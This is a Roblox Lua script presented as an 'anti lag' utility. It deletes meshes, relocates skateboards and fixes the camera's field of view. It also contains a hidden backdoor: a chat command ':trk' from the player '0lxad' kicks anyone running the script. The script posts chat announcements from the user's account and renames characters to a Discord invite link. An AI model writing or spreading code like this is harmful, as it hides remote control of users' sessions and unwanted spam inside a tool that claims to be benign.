local Players = game:GetService("Players")
local Player = game:GetService('Players').LocalPlayer or game:GetService('Players'):WaitForChild('LocalPlayer')
local runservice = game:GetService('RunService')
local safe = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
if Player.Name ~= '0lxad' then
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
end
for i,descendant in game.Workspace:GetDescendants() do
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.Name = 'Fixed by nim'
            descendant.DisplayName = 'https://discord.gg/5Ygs9nHRyW'
        end
	end
end
	
local function onDescendantAdded(descendant)
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
		    descendant.Name = 'Fixed by nim'
            descendant.DisplayName = 'https://discord.gg/5Ygs9nHRyW'
        end
	end
end

rchat = function(Message)
  Players:Chat(Message)
end

game.Players.PlayerAdded:Connect(function(plr)
	if plr.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = plr
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, '.')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, '.')[2]
            	Player:Kick(kmsg)
      			end
    		end
		end)
	end
end)

runservice.Stepped:Connect(function()
    for i,v in pairs(workspace:GetDescendants())do
        if v.Name=='Mesh' or v.Name=='SpecialMesh' then
            if v.Parent.Name~='Head' and v.Parent.Name~='Handle' then
                if not v:IsDescendantOf(Workspace.SecureParts) then
                    v:Destroy()
                end
            end
	    elseif v.ClassName == 'SkateboardPlatform' then
			if v.Position ~= safe then
            	v.CFrame = safe
            	v.Name = 'NoBoard xd'
			end
        end
    end
	if workspace.Camera.FieldOfView ~= 70 then
		workspace.Camera.FieldOfView = 70
	end
end)

workspace.DescendantAdded:Connect(onDescendantAdded)
wait(1)
game.Chat.BubbleChatEnabled = false

if Player.Name ~= '0lxad' and ann == false then
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("1ucd>","all")
local ann = true
end
